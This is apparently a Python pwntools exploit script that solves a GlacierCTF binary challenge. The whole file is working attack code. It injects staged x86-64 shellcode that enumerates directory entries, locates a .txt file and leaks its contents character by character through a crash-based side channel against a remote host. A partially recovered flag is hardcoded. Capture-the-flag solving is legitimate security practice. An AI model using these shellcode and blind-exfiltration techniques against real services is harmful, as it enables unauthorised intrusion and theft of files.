#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import string

from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc chall.glacierctf.com 13383"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}

sc1 = asm("""\
mov rsi, rdx
xor edi, edi
mov edx, 0x1000
syscall
""")

path_cwd = b"./"
if args.REMOTE:
    interval = 0.35
else:
    interval = 0.05
sc2 = ""
for i in range(0, len(path_cwd), 8):
    sc2 = f"mov rax, 0x{path_cwd[i:i+8][::-1].hex()}\npush rax\n" + sc2

# sc2 += """\
#     mov rsi, rsp
#     xor edx, edx
#     xor edi, edi
#     sub edi, 100
#     push 0x101
#     pop rax
#     syscall

#     mov r15, rax
#     sub rsp, 0x1000
#     mov rsi, rsp

#     mov rdi, rsp
#     xor eax, eax
#     mov rcx, 0x400
#     rep stosd

#     mov rdi, r15

#     push 0x1000
#     pop rdx
#     push 0x4e
#     pop rax
#     syscall
#     mov r13, rax
#     mov r12, rsp
#     xor r14, r14
#     jmp loop2

# loop1:
#     add r12, r14
#     test r13, r13
#     jz crash

# loop2:
#     lea r15, [r12+0x10]
#     xor r14, r14
#     mov r14, QWORD PTR [r15]
#     and r14, 0xffff
#     sub r13, r14

#     lea r15, [r12]
#     add r15, r14
#     dec r15
#     mov al, BYTE PTR [r15]
#     cmp al, 0x8
#     jne loop1

#     lea r15, [r12+0x12]
#     xor r9, r9
#     jmp loop4

# loop3:
#     inc r9
#     test eax, eax
#     jz loop1

# loop4:
#     xor eax, eax
#     xor edi, edi
#     mov rsi, r12
#     sub rsi, 0x100
#     add rsi, r9
#     mov rdx, 0x2
#     syscall

#     mov al, BYTE PTR [r15+r9]
#     mov bl, BYTE PTR [rsi]
#     cmp al, bl
#     je loop3

# crash:
#     xor eax, eax
#     mov BYTE PTR [eax], al
# """

sc2 += """\
    mov rsi, rsp
    xor edx, edx
    xor edi, edi
    sub edi, 100
    push 0x101
    pop rax
    syscall

    mov r15, rax
    sub rsp, 0x4000
    mov rsi, rsp

    mov rdi, rsp
    xor eax, eax
    mov rcx, 0x1000
    rep stosd

    mov rdi, r15
    push 0x4000
    pop rdx
    push 0x4e
    pop rax
    syscall
    mov r13, rax
    mov r12, rsp
    xor r14, r14
    jmp loop2

loop1:
    add r12, r14
    test r13, r13
    jz crash

loop2:
    lea r15, [r12+0x10]
    xor r14, r14
    mov r14, QWORD PTR [r15]
    and r14, 0xffff
    sub r13, r14
    lea r15, [r12]
    add r15, r14
    dec r15
    mov al, BYTE PTR [r15]
    cmp al, 0x8
    jne loop1
    dec r15
    sub r15, 0x3

loop6:
    mov eax, DWORD PTR [r15]
    and eax, 0xffffff
    mov ebx, 0x747874
    cmp eax, ebx
    je loop5
    lea rax, [r12+0x12]
    cmp r15, rax
    je loop1
    dec r15
    jmp loop6

loop5:
    mov rbx, r15
    lea r15, [r12+0x12]
loop10:
    mov al, BYTE PTR [r15]
    cmp al, 0x2e
    je loop8
    cmp al, 0x30
    jl loop1
    cmp al, 0x39
    jg loop7
    jmp loop8

loop7:
    cmp al, 0x41
    jl loop1
    cmp al, 0x5a
    jg loop9
    jmp loop8

loop9:
    cmp al, 0x61
    jl loop1
    cmp al, 0x7a
    jg loop1

loop8:
    inc r15
    cmp r15, rbx
    jne loop10

    lea rsi, [r12+0x12]
    sub rsp, 0x400
    mov rdi, rsp
    mov rcx, r14
    sub rcx, 0x12
    rep movsb
"""

sc3 = ""
for i in range(0, len(path_cwd), 8):
    inst = f"mov rax, 0x{path_cwd[i:i+8][::-1].hex().ljust(16, '0')}\n"
    inst += "push rax\n"
    sc3 = inst + sc3

sc3 += f"""\
    mov rsi, rsp
    add rsi, {8 - len(path_cwd) % 8}
"""

sc2 += sc3

sc2 += """\
    xor edi, edi
    sub edi, 100
    xor edx, edx
    push 0x101
    pop rax
    syscall

    mov r15, rax
    mov rsi, rsp

    mov rdi, rsp
    xor eax, eax
    mov rcx, 0x400
    rep stosd

    mov rdi, r15
    mov rdx, 0x200
    xor eax, eax
    syscall

    lea r15, [rsi]
    jmp loop4

loop3:
    test eax, eax
    jz crash

loop4:
    xor eax, eax
    xor edi, edi
    mov rsi, rsp
    sub rsi, 0x100
    mov rdx, 0x3
    syscall

    xor rcx, rcx
    mov cl, BYTE PTR [rsi+1]
    mov al, BYTE PTR [r15+rcx]
    mov bl, BYTE PTR [rsi]
    cmp al, bl
    je loop3

crash:
    xor eax, eax
    sub rax, 1
    mov BYTE PTR [eax], al
    mov BYTE PTR [eax], al
    mov BYTE PTR [eax], al
    mov BYTE PTR [eax], al
    mov BYTE PTR [eax], al
"""

sc2 = b"\x90" * len(sc1) + asm(sc2)

charset = "\x00_.}{" + string.printable[:-5]
ptr = -1
if args.REMOTE:
    known = "gctf{W41t_d1D_yoU_R3aLlY_r3Bu1d_L$?}"
else:
    known = ""

with log.progress("enumerating") as pro:
    while len(known) == 0 or known[-1] != "}":
        with context.quiet:
            io = start()

        ptr += 1
        if ptr == len(charset):
            with context.quiet:
                io.close()
            break

        io.sendlineafter(b"Shellcode: ", sc1)
        sleep(interval)
        io.send(sc2)

        # for i in known:
        #     sleep(interval)
        #     io.sendline(i.encode())

        sleep(interval)
        io.sendline(charset[ptr].encode() + p8(len(known)))
        pro.status(known + charset[ptr])
        try:
            io.recv(timeout=interval)
            io.recv(timeout=interval)
            io.recv(timeout=interval)
            # if charset[ptr] == "\x00":
            #     break
            known += charset[ptr]
            ptr = -1
        except EOFError:
            pass

        with context.quiet:
            io.close()

print(known)
